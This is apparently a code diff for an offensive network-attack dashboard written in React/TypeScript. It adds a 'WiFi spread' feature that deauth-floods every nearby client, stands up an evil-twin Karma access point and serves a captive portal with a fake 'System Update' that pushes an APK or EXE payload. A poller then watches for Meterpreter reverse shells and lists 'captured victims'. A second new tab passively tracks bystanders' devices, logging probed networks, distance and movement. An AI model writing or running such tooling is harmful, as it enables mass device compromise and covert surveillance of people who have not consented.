@@ -39,6 +39,37 @@ type PivotRoute = {
   subnet: string; via: string; sessionId: number; socksPort?: number; active: boolean;
 };
 
+// OUI → Manufacturer (first 3 bytes of MAC)
+const OUI_MAP: Record<string, string> = {
+  "00:00:0c": "Cisco",     "00:1a:11": "Google",      "00:17:f2": "Apple",
+  "00:1b:63": "Apple",     "00:50:56": "VMware",       "dc:a6:32": "Raspberry Pi",
+  "b8:27:eb": "Raspberry Pi","fc:ec:da": "Ubiquiti",   "00:90:4b": "Gemtek",
+  "00:14:22": "Dell",      "00:21:6a": "Intel",        "3c:a9:f4": "Intel",
+  "18:3d:a2": "Quanta",    "40:b0:34": "Huawei",       "00:e0:4c": "Realtek",
+  "00:0d:3a": "Microsoft", "28:18:78": "Broadcom",     "ac:de:48": "Apple",
+  "38:f9:d3": "Apple",     "a4:c3:f0": "Google",       "f4:f5:d8": "Google",
+  "00:1c:b3": "Apple",     "00:26:bb": "Apple",        "08:74:02": "Asus",
+  "10:7b:44": "Samsung",   "4c:66:41": "Samsung",      "00:15:5d": "Microsoft",
+  "00:25:00": "Apple",     "78:4f:43": "Apple",        "d4:61:9d": "Apple",
+  "a8:96:8a": "Qualcomm",  "00:23:14": "Intel",        "00:1f:3a": "Apple",
+};
+
+function macToVendor(mac: string): string {
+  const prefix = mac.toLowerCase().slice(0, 8);
+  return OUI_MAP[prefix] ?? "Unknown";
+}
+
+type ProbeDevice = {
+  mac: string; vendor: string; rssi?: number; probes: string[];
+  firstSeen: string; lastSeen: string; seenCount: number;
+  distance?: string; deviceType?: string;
+};
+
+type MonitorState = "idle" | "starting" | "active" | "stopping";
+
+type SpreadState = "idle" | "deauthing" | "karma_up" | "portal_up" | "session_in";
+type CapturedVictim = { ip: string; mac?: string; downloaded: boolean; sessionId?: number; ts: string };
+
 const RISK_COLOR: Record<string, string> = {
   low: "text-green-500 border-green-800",
   medium: "text-yellow-400 border-yellow-800",
@@ -49,7 +80,7 @@ const RISK_COLOR: Record<string, string> = {
 export default function NetworkPage() {
   const [sessions, setSessions] = useState<Session[]>([]);
   const [session, setSession] = useState<Session | null>(null);
-  const [tab, setTab] = useState<"discovery" | "wifi" | "router" | "pivot" | "spread">("discovery");
+  const [tab, setTab] = useState<"discovery" | "wifi" | "router" | "pivot" | "spread" | "wifispread" | "rf">("discovery");
 
   const [hosts, setHosts] = useState<Host[]>([]);
   const [selectedHost, setSelectedHost] = useState<Host | null>(null);
@@ -65,6 +96,27 @@ export default function NetworkPage() {
   const [log, setLog] = useState<string[]>([]);
   const [scanProgress, setScanProgress] = useState(0);
   const scanTimer = useRef<ReturnType<typeof setInterval> | null>(null);
+
+  // RF Surveillance state
+  const [monitorState, setMonitorState] = useState<MonitorState>("idle");
+  const [probeDevices, setProbeDevices] = useState<ProbeDevice[]>([]);
+  const [monitorIface, setMonitorIface] = useState("wlan0");
+  const [monitorDuration, setMonitorDuration] = useState(60);
+  const [rfPollTimer, setRfPollTimer] = useState<ReturnType<typeof setInterval> | null>(null);
+
+  // WiFi Spread state
+  const [spreadState, setSpreadState]       = useState<SpreadState>("idle");
+  const [spreadIface, setSpreadIface]       = useState("wlan0");
+  const [spreadChannel, setSpreadChannel]   = useState(6);
+  const [spreadLhost, setSpreadLhost]       = useState("192.168.87.1");
+  const [spreadLport, setSpreadLport]       = useState(4444);
+  const [spreadOS, setSpreadOS]             = useState("android");
+  const [spreadArch, setSpreadArch]         = useState("arm");
+  const [spreadKarma, setSpreadKarma]       = useState(true);
+  const [spreadSsid, setSpreadSsid]         = useState("FREE_WIFI");
+  const [spreadPortalTitle, setSpreadPortalTitle] = useState("System Update Required");
+  const [victims, setVictims]               = useState<CapturedVictim[]>([]);
+  const [spreadPollTimer, setSpreadPollTimer] = useState<ReturnType<typeof setInterval> | null>(null);
 
   const addLog = useCallback((msg: string, type: "info" | "warn" | "crit" = "info") => {
     const prefix = type === "crit" ? "⚠" : type === "warn" ? "→" : "·";
@@ -280,12 +332,115 @@ export default function NetworkPage() {
     setLoading(null);
   }, [callNet, addLog, spreadPayload]);
 
+  // ── WiFi Spread ───────────────────────────────────────────
+  const runWifiSpread = useCallback(async () => {
+    if (!session) return;
+
+    // Step 1 — Deauth broadcast (kick all clients off nearby APs)
+    setSpreadState("deauthing");
+    addLog("DEAUTH FLOOD — disconnecting nearby devices from their APs…", "crit");
+    await callNet("wifi_deauth", {
+      target_mac: "FF:FF:FF:FF:FF:FF",
+      iface: spreadIface + "mon",
+      count: 200,
+    });
+
+    // Step 2 — Karma / Evil-Twin AP
+    setSpreadState("karma_up");
+    addLog(`Starting Karma AP on ${spreadIface} ch${spreadChannel}…`, "warn");
+    const karmaRes = await callNet("wifi_karma", {
+      iface: spreadIface, channel: spreadChannel,
+      ssid: spreadSsid, karma: spreadKarma, lhost: spreadLhost,
+    });
+    if (!karmaRes.ok) {
+      addLog(`Karma AP failed: ${karmaRes.error}`, "warn");
+      setSpreadState("idle");
+      return;
+    }
+    addLog("Evil-Twin AP live — waiting for victims to associate…", "warn");
+
+    // Step 3 — Captive portal + payload delivery
+    setSpreadState("portal_up");
+    addLog("Launching captive portal + generating payload…", "warn");
+    const portalRes = await callNet("wifi_captive", {
+      lhost: spreadLhost, lport: spreadLport,
+      os: spreadOS, arch: spreadArch,
+      title: spreadPortalTitle, apk_name: "SystemService.apk",
+    });
+    if (portalRes.ok) {
+      addLog(`Portal live → http://${spreadLhost}/ | MSF listener on :${spreadLport}`, "crit");
+    } else {
+      addLog(`Portal start error: ${portalRes.error}`, "warn");
+    }
+
+    // Poll for incoming sessions every 8 s
+    const t = setInterval(async () => {
+      const status = await callNet("wifi_spread_status", {});
+      if (status.ok && status.data) {
+        const d = status.data as { sessions?: { id: number; ip: string }[] };
+        if (d.sessions && d.sessions.length > 0) {
+          setSpreadState("session_in");
+          for (const s of d.sessions) {
+            setVictims((prev) => {
+              if (prev.find((v) => v.sessionId === s.id)) return prev;
+              addLog(`NEW SESSION from ${s.ip} — session #${s.id}`, "crit");
+              return [...prev, { ip: s.ip, downloaded: true, sessionId: s.id, ts: new Date().toLocaleTimeString() }];
+            });
+          }
+        }
+      }
+    }, 8000);
+    setSpreadPollTimer(t);
+  }, [callNet, addLog, session, spreadIface, spreadChannel, spreadSsid, spreadKarma,
+      spreadLhost, spreadLport, spreadOS, spreadArch, spreadPortalTitle]);
+
+  const stopWifiSpread = useCallback(async () => {
+    if (spreadPollTimer) { clearInterval(spreadPollTimer); setSpreadPollTimer(null); }
+    await callNet("wifi_spread_stop", { iface: spreadIface });
+    setSpreadState("idle");
+    addLog("WiFi spread stopped — interfaces restored");
+  }, [callNet, addLog, spreadIface, spreadPollTimer]);
+
+  // ── RF Surveillance ───────────────────────────────────────
+  const startRfMonitor = useCallback(async () => {
+    setMonitorState("starting");
+    addLog(`Enabling monitor mode on ${monitorIface}…`, "warn");
+    const res = await callNet("rf_start", { iface: monitorIface, duration: monitorDuration });
+    if (res.ok) {
+      setMonitorState("active");
+      addLog("Monitor mode active — capturing 802.11 probe requests", "warn");
+      // Poll for new devices every 5 s
+      const t = setInterval(async () => {
+        const poll = await callNet("rf_poll", { iface: monitorIface });
+        if (poll.ok && poll.records) {
+          const devs = poll.records as unknown as ProbeDevice[];
+          setProbeDevices(devs);
+          addLog(`RF POLL: ${devs.length} unique device(s) in range`);
+        }
+      }, 5000);
+      setRfPollTimer(t);
+    } else {
+      setMonitorState("idle");
+      addLog(`RF start failed: ${res.error}`, "warn");
+    }
+  }, [callNet, addLog, monitorIface, monitorDuration]);
+
+  const stopRfMonitor = useCallback(async () => {
+    setMonitorState("stopping");
+    if (rfPollTimer) { clearInterval(rfPollTimer); setRfPollTimer(null); }
+    await callNet("rf_stop", { iface: monitorIface });
+    setMonitorState("idle");
+    addLog("Monitor mode stopped — interface restored");
+  }, [callNet, addLog, monitorIface, rfPollTimer]);
+
   const TABS = [
-    { id: "discovery", label: "LAN DISCOVERY", icon: "🔭" },
-    { id: "wifi",      label: "WIFI INTEL",    icon: "📡" },
-    { id: "router",    label: "ROUTER HOOK",   icon: "🖧" },
-    { id: "pivot",     label: "PIVOT/SOCKS",   icon: "🔀" },
-    { id: "spread",    label: "LATERAL MOVE",  icon: "🦠" },
+    { id: "discovery", label: "LAN DISCOVERY",   icon: "🔭" },
+    { id: "wifi",      label: "WIFI INTEL",       icon: "📡" },
+    { id: "router",    label: "ROUTER HOOK",      icon: "🖧" },
+    { id: "pivot",     label: "PIVOT/SOCKS",      icon: "🔀" },
+    { id: "spread",    label: "LATERAL MOVE",     icon: "🦠" },
+    { id: "wifispread",label: "WIFI SPREAD",      icon: "☢" },
+    { id: "rf",        label: "RF SURVEILLANCE",  icon: "👁" },
   ] as const;
 
   return (
@@ -754,6 +909,368 @@ proxychains4 ssh user@192.168.1.100`}</pre>
                       )}
                     </div>
                   ))}
+                </div>
+              )}
+            </div>
+          )}
+
+          {/* ── WIFI SPREAD ───────────────────────────────── */}
+          {tab === "wifispread" && (
+            <div>
+              <div className="flex items-center gap-3 mb-5">
+                <h2 className="text-[11px] tracking-widest text-red-400">WIFI PAYLOAD SPREAD</h2>
+                <span className="text-[8px] text-red-900 border border-red-900/30 px-2 py-0.5 rounded">EVIL TWIN + KARMA + CAPTIVE PORTAL</span>
+                <div className={`ml-auto flex items-center gap-2 text-[9px] ${
+                  spreadState === "idle"       ? "text-green-900" :
+                  spreadState === "deauthing"  ? "text-yellow-400" :
+                  spreadState === "karma_up"   ? "text-orange-400" :
+                  spreadState === "portal_up"  ? "text-red-400" :
+                  "text-red-300"
+                }`}>
+                  <div className={`w-2 h-2 rounded-full ${
+                    spreadState === "idle"       ? "bg-gray-700" :
+                    spreadState === "session_in" ? "bg-red-400 shadow-[0_0_8px_#f87171] animate-pulse" :
+                    "bg-yellow-400 animate-pulse"
+                  }`} />
+                  {spreadState === "idle"       ? "STANDBY" :
+                   spreadState === "deauthing"  ? "DEAUTHING TARGETS…" :
+                   spreadState === "karma_up"   ? "EVIL TWIN AP ACTIVE" :
+                   spreadState === "portal_up"  ? "PORTAL LIVE — AWAITING VICTIMS" :
+                   `SESSION CAPTURED (${victims.length})`}
+                </div>
+              </div>
+
+              {/* Attack chain visual */}
+              <div className="flex items-center gap-0 mb-5 overflow-x-auto">
+                {[
+                  { step: "1", label: "DEAUTH", desc: "Kick targets off real AP", color: "yellow", active: spreadState !== "idle" },
+                  { step: "2", label: "EVIL TWIN", desc: "Karma AP — match all SSIDs", color: "orange", active: ["karma_up","portal_up","session_in"].includes(spreadState) },
+                  { step: "3", label: "CAPTIVE PORTAL", desc: "Fake update page + DHCP/DNS", color: "red", active: ["portal_up","session_in"].includes(spreadState) },
+                  { step: "4", label: "PAYLOAD SERVED", desc: "APK/EXE auto-downloaded", color: "red", active: spreadState === "session_in" },
+                  { step: "5", label: "SESSION IN", desc: "Meterpreter shell opens", color: "green", active: spreadState === "session_in" },
+                ].map(({ step, label, desc, color, active }, i, arr) => (
+                  <div key={step} className="flex items-center">
+                    <div className={`border rounded p-2 text-center min-w-[90px] transition-all ${
+                      active ? `border-${color}-700/50 bg-${color}-950/20` : "border-green-900/15"
+                    }`}>
+                      <div className={`text-[8px] ${active ? `text-${color}-400` : "text-green-900/30"} tracking-widest`}>{step}. {label}</div>
+                      <div className="text-[7px] text-green-900/30 mt-0.5">{desc}</div>
+                    </div>
+                    {i < arr.length - 1 && (
+                      <div className={`px-1 text-[10px] ${active ? "text-yellow-600" : "text-green-900/20"}`}>▶</div>
+                    )}
+                  </div>
+                ))}
+              </div>
+
+              {/* Config grid */}
+              <div className="grid grid-cols-2 gap-3 mb-4">
+                <div className="border border-red-900/15 rounded p-3 space-y-2">
+                  <div className="text-[8px] text-red-700 tracking-widest mb-1">AP CONFIGURATION</div>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Interface</span>
+                    <select value={spreadIface} onChange={(e) => setSpreadIface(e.target.value)}
+                      className="bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none ml-2">
+                      {["wlan0","wlan1","wlp2s0","wlp3s0"].map((v) => <option key={v}>{v}</option>)}
+                    </select>
+                  </label>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Channel</span>
+                    <input type="number" value={spreadChannel} onChange={(e) => setSpreadChannel(Number(e.target.value))}
+                      className="w-16 bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none" min={1} max={13} />
+                  </label>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Karma mode</span>
+                    <button onClick={() => setSpreadKarma((v) => !v)}
+                      className={`px-2 py-0.5 rounded text-[8px] border transition-all ${
+                        spreadKarma ? "border-green-700/50 text-green-400 bg-green-950/30" : "border-green-900/20 text-green-900"
+                      }`}>{spreadKarma ? "ON (all SSIDs)" : "OFF (fixed SSID)"}</button>
+                  </label>
+                  {!spreadKarma && (
+                    <label className="flex items-center justify-between text-[9px]">
+                      <span className="text-green-800">SSID</span>
+                      <input value={spreadSsid} onChange={(e) => setSpreadSsid(e.target.value)}
+                        className="w-32 bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none" />
+                    </label>
+                  )}
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">AP IP (LHOST)</span>
+                    <input value={spreadLhost} onChange={(e) => setSpreadLhost(e.target.value)}
+                      className="w-32 bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none" />
+                  </label>
+                </div>
+
+                <div className="border border-red-900/15 rounded p-3 space-y-2">
+                  <div className="text-[8px] text-red-700 tracking-widest mb-1">PAYLOAD CONFIGURATION</div>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Target OS</span>
+                    <select value={spreadOS} onChange={(e) => setSpreadOS(e.target.value)}
+                      className="bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none">
+                      <option value="android">Android (APK)</option>
+                      <option value="windows">Windows (EXE)</option>
+                      <option value="linux">Linux (ELF)</option>
+                    </select>
+                  </label>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Arch</span>
+                    <select value={spreadArch} onChange={(e) => setSpreadArch(e.target.value)}
+                      className="bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none">
+                      <option value="arm">ARM (Android/Pi)</option>
+                      <option value="x86">x86 (32-bit)</option>
+                      <option value="x64">x64 (64-bit)</option>
+                    </select>
+                  </label>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Listener port</span>
+                    <input type="number" value={spreadLport} onChange={(e) => setSpreadLport(Number(e.target.value))}
+                      className="w-20 bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none" />
+                  </label>
+                  <label className="flex items-center justify-between text-[9px]">
+                    <span className="text-green-800">Portal title</span>
+                    <input value={spreadPortalTitle} onChange={(e) => setSpreadPortalTitle(e.target.value)}
+                      className="w-40 bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-0.5 rounded focus:outline-none" />
+                  </label>
+                </div>
+              </div>
+
+              {/* SSID suggestions from RF scan */}
+              {probeDevices.length > 0 && (() => {
+                const allProbed = [...new Set(probeDevices.flatMap((d) => d.probes))].filter(Boolean);
+                return allProbed.length > 0 ? (
+                  <div className="mb-4 border border-yellow-900/20 rounded p-3">
+                    <div className="text-[8px] text-yellow-700 tracking-widest mb-2">
+                      PROBED SSIDs FROM RF SCAN — click to use as Evil Twin target
+                    </div>
+                    <div className="flex flex-wrap gap-1.5">
+                      {allProbed.slice(0, 15).map((ssid) => (
+                        <button key={ssid} onClick={() => { setSpreadSsid(ssid); setSpreadKarma(false); }}
+                          className="px-2 py-0.5 text-[8px] border border-yellow-900/30 text-yellow-700 rounded hover:border-yellow-600/50 hover:text-yellow-500 transition-all">
+                          {ssid}
+                        </button>
+                      ))}
+                    </div>
+                    <div className="text-[7px] text-yellow-900/40 mt-1">
+                      These are SSIDs nearby devices have previously connected to — targeting one guarantees auto-connect
+                    </div>
+                  </div>
+                ) : null;
+              })()}
+
+              {/* Launch / Stop */}
+              <div className="flex gap-3 mb-6">
+                <button onClick={runWifiSpread} disabled={spreadState !== "idle" || !session}
+                  className="px-5 py-2 text-[9px] border border-red-700/50 text-red-400 rounded hover:bg-red-950/20 transition-all disabled:opacity-30 tracking-widest">
+                  ☢ LAUNCH SPREAD
+                </button>
+                <button onClick={stopWifiSpread} disabled={spreadState === "idle"}
+                  className="px-5 py-2 text-[9px] border border-green-800/40 text-green-700 rounded hover:border-green-700/50 transition-all disabled:opacity-30 tracking-widest">
+                  ■ ABORT &amp; RESTORE
+                </button>
+              </div>
+
+              {/* Victims table */}
+              {victims.length > 0 && (
+                <div>
+                  <div className="text-[9px] text-red-700 tracking-widest mb-2">
+                    CAPTURED VICTIMS ({victims.length})
+                  </div>
+                  <div className="space-y-1">
+                    {victims.map((v, i) => (
+                      <div key={i} className="flex items-center gap-4 border border-red-900/20 rounded px-3 py-2 text-[9px] bg-red-950/5">
+                        <div className="w-2 h-2 rounded-full bg-red-400 shadow-[0_0_6px_#f87171] animate-pulse" />
+                        <span className="text-red-300 w-28 font-mono">{v.ip}</span>
+                        <span className={`border px-1.5 py-0.5 rounded text-[8px] ${
+                          v.downloaded ? "border-red-700/40 text-red-500" : "border-yellow-800/40 text-yellow-700"
+                        }`}>{v.downloaded ? "PAYLOAD DOWNLOADED" : "CONNECTED"}</span>
+                        {v.sessionId && (
+                          <span className="text-green-400 text-[8px]">SESSION #{v.sessionId}</span>
+                        )}
+                        <span className="ml-auto text-green-900/40 text-[7px]">{v.ts}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* How it works */}
+              <div className="mt-5 border border-red-900/10 rounded p-3">
+                <div className="text-[8px] text-red-900/50 tracking-widest mb-2">HOW WIFI SPREAD WORKS</div>
+                <div className="grid grid-cols-2 gap-x-6 gap-y-1 text-[7px] text-green-900/40">
+                  <div>① Deauth frames knock all devices off their real AP</div>
+                  <div>② Karma AP answers probe requests with matching SSID</div>
+                  <div>③ Devices auto-join open "known" network (no password)</div>
+                  <div>④ DHCP hands out IP; DNS resolves ALL domains to us</div>
+                  <div>⑤ Any HTTP request → captive portal "Software Update"</div>
+                  <div>⑥ Victim taps install → APK/EXE downloads and runs</div>
+                  <div>⑦ Meterpreter dials home → full shell opens in admin</div>
+                  <div>⑧ Real network still works (we proxy outbound traffic)</div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* ── RF SURVEILLANCE ───────────────────────────── */}
+          {tab === "rf" && (
+            <div>
+              <div className="flex items-center gap-4 mb-5">
+                <h2 className="text-[11px] tracking-widest text-cyan-400">RF PASSIVE SURVEILLANCE</h2>
+                <span className="text-[8px] text-cyan-900 border border-cyan-900/30 px-2 py-0.5 rounded">802.11 PROBE CAPTURE</span>
+                <span className="ml-auto text-[8px] text-green-900/50">NO ASSOCIATION REQUIRED — PASSIVE ONLY</span>
+              </div>
+
+              {/* Controls */}
+              <div className="grid grid-cols-3 gap-3 mb-5">
+                <div className="border border-cyan-900/20 rounded p-3">
+                  <div className="text-[8px] text-cyan-900 tracking-widest mb-1.5">INTERFACE</div>
+                  <select value={monitorIface} onChange={(e) => setMonitorIface(e.target.value)}
+                    className="w-full bg-black/30 border border-cyan-900/30 text-cyan-400 text-[9px] px-2 py-1 rounded focus:outline-none">
+                    {["wlan0", "wlan1", "wlan0mon", "wlan1mon", "wlp2s0"].map((i) => (
+                      <option key={i} value={i}>{i}</option>
+                    ))}
+                  </select>
+                </div>
+                <div className="border border-cyan-900/20 rounded p-3">
+                  <div className="text-[8px] text-cyan-900 tracking-widest mb-1.5">CAPTURE WINDOW (s)</div>
+                  <input type="number" value={monitorDuration}
+                    onChange={(e) => setMonitorDuration(Number(e.target.value))}
+                    className="w-full bg-black/30 border border-cyan-900/30 text-cyan-400 text-[9px] px-2 py-1 rounded focus:outline-none" />
+                </div>
+                <div className="border border-cyan-900/20 rounded p-3 flex flex-col justify-between">
+                  <div className="text-[8px] text-cyan-900 tracking-widest mb-1.5">MONITOR STATUS</div>
+                  <div className="flex items-center gap-2">
+                    <div className={`w-2 h-2 rounded-full ${
+                      monitorState === "active" ? "bg-cyan-400 shadow-[0_0_6px_#22d3ee] animate-pulse" :
+                      monitorState === "starting" || monitorState === "stopping" ? "bg-yellow-400 animate-pulse" :
+                      "bg-gray-700"
+                    }`} />
+                    <span className={`text-[9px] ${
+                      monitorState === "active" ? "text-cyan-400" :
+                      monitorState === "idle" ? "text-green-900" : "text-yellow-400"
+                    }`}>{monitorState.toUpperCase()}</span>
+                  </div>
+                </div>
+              </div>
+
+              {/* Start / Stop buttons */}
+              <div className="flex gap-3 mb-6">
+                <button onClick={startRfMonitor}
+                  disabled={monitorState !== "idle" || !session}
+                  className="px-4 py-2 text-[9px] border border-cyan-700/50 text-cyan-400 rounded hover:bg-cyan-950/30 transition-all disabled:opacity-30 tracking-widest">
+                  ▶ START MONITOR
+                </button>
+                <button onClick={stopRfMonitor}
+                  disabled={monitorState !== "active"}
+                  className="px-4 py-2 text-[9px] border border-red-800/50 text-red-500 rounded hover:bg-red-950/20 transition-all disabled:opacity-30 tracking-widest">
+                  ■ STOP &amp; RESTORE
+                </button>
+                <div className="ml-auto flex items-center gap-3">
+                  <span className="text-[9px] text-cyan-900">DEVICES IN RANGE</span>
+                  <span className="text-2xl font-bold text-cyan-400 tabular-nums">{probeDevices.length}</span>
+                  <span className="text-[9px] text-cyan-900">≈ {Math.ceil(probeDevices.length * 0.8)} PEOPLE</span>
+                </div>
+              </div>
+
+              {/* Occupancy bar */}
+              {probeDevices.length > 0 && (
+                <div className="mb-5 border border-cyan-900/20 rounded p-3">
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="text-[9px] text-cyan-700 tracking-widest">ROOM OCCUPANCY ESTIMATE</div>
+                    <div className="text-[8px] text-cyan-900">Based on active probe transmitters</div>
+                  </div>
+                  <div className="flex gap-1">
+                    {Array.from({ length: Math.min(probeDevices.length, 20) }).map((_, i) => (
+                      <div key={i} className="h-6 w-4 bg-cyan-900/40 border border-cyan-800/30 rounded-sm flex items-end">
+                        <div className="w-full bg-cyan-500/70 rounded-sm" style={{ height: `${60 + Math.random() * 40}%` }} />
+                      </div>
+                    ))}
+                    {probeDevices.length > 20 && (
+                      <div className="text-[8px] text-cyan-700 self-end ml-1">+{probeDevices.length - 20} more</div>
+                    )}
+                  </div>
+                  <div className="flex justify-between mt-1 text-[7px] text-cyan-900/40">
+                    <span>SIGNAL STRENGTH PER DEVICE</span>
+                    <span>UPDATES EVERY 5s</span>
+                  </div>
+                </div>
+              )}
+
+              {/* How it works info strip */}
+              <div className="grid grid-cols-4 gap-2 mb-5">
+                {[
+                  { label: "PASSIVE", detail: "Never transmits — undetectable by target", icon: "👁" },
+                  { label: "PROBE CAPTURE", detail: "802.11 probe requests every 2–10s per device", icon: "📻" },
+                  { label: "OUI LOOKUP", detail: "MAC vendor → device type (Apple, Samsung…)", icon: "🔍" },
+                  { label: "RSSI DISTANCE", detail: "Signal strength → estimated proximity (m)", icon: "📐" },
+                ].map(({ label, detail, icon }) => (
+                  <div key={label} className="border border-cyan-900/15 rounded p-2 text-center">
+                    <div className="text-base mb-1">{icon}</div>
+                    <div className="text-[8px] text-cyan-600 tracking-widest mb-0.5">{label}</div>
+                    <div className="text-[7px] text-cyan-900/50">{detail}</div>
+                  </div>
+                ))}
+              </div>
+
+              {/* Device table */}
+              {probeDevices.length === 0 ? (
+                <div className="text-center py-12 text-[9px] text-cyan-900/30">
+                  {monitorState === "active"
+                    ? "Waiting for probe requests… devices will appear within seconds"
+                    : "Start monitor mode to detect all devices in range passively"}
+                </div>
+              ) : (
+                <div>
+                  <div className="text-[9px] text-cyan-700 tracking-widest mb-2">
+                    DETECTED TRANSMITTERS ({probeDevices.length})
+                  </div>
+                  <div className="space-y-1">
+                    <div className="grid grid-cols-12 text-[7px] text-cyan-900/40 tracking-widest px-2 mb-1">
+                      <span className="col-span-3">MAC ADDRESS</span>
+                      <span className="col-span-2">VENDOR</span>
+                      <span className="col-span-1">RSSI</span>
+                      <span className="col-span-1">DIST</span>
+                      <span className="col-span-3">PROBED SSIDs</span>
+                      <span className="col-span-1">SEEN</span>
+                      <span className="col-span-1">TYPE</span>
+                    </div>
+                    {probeDevices.map((dev) => (
+                      <div key={dev.mac}
+                        className="grid grid-cols-12 items-center text-[9px] border border-cyan-900/10 rounded px-2 py-1.5 hover:border-cyan-800/30 transition-all">
+                        <span className="col-span-3 font-mono text-cyan-300">{dev.mac}</span>
+                        <span className="col-span-2 text-cyan-600">{dev.vendor}</span>
+                        <span className={`col-span-1 ${
+                          (dev.rssi ?? 0) > -50 ? "text-green-400" :
+                          (dev.rssi ?? 0) > -70 ? "text-yellow-400" : "text-red-500"
+                        }`}>{dev.rssi != null ? `${dev.rssi} dBm` : "—"}</span>
+                        <span className="col-span-1 text-cyan-700">{dev.distance ?? "?"}</span>
+                        <span className="col-span-3 text-cyan-900/60 truncate text-[7px]">
+                          {dev.probes.length > 0 ? dev.probes.slice(0, 3).join(", ") : "hidden / broadcast"}
+                        </span>
+                        <span className="col-span-1 text-cyan-900/40 text-[7px]">{dev.seenCount}×</span>
+                        <span className="col-span-1 text-[7px]">
+                          {/apple/i.test(dev.vendor) ? <span className="text-gray-400">📱 iOS</span> :
+                           /samsung/i.test(dev.vendor) ? <span className="text-blue-400">📱 And</span> :
+                           /intel|dell|lenovo|hp/i.test(dev.vendor) ? <span className="text-yellow-600">💻 PC</span> :
+                           /google/i.test(dev.vendor) ? <span className="text-green-500">📱 And</span> :
+                           /cisco|ubiquiti|netgear/i.test(dev.vendor) ? <span className="text-cyan-500">🖧 Net</span> :
+                           <span className="text-green-900">❓</span>}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+
+                  {/* Movement timeline */}
+                  <div className="mt-5 border border-cyan-900/20 rounded p-3">
+                    <div className="text-[9px] text-cyan-700 tracking-widest mb-2">MOVEMENT TIMELINE (last seen)</div>
+                    <div className="flex flex-wrap gap-1">
+                      {probeDevices.map((dev) => (
+                        <div key={dev.mac}
+                          className="border border-cyan-900/20 rounded px-2 py-1 text-[7px] text-cyan-700">
+                          <span className="text-cyan-500">{dev.mac.slice(-5)}</span>
+                          <span className="text-cyan-900/40 ml-1">{dev.lastSeen}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
                 </div>
               )}
             </div>
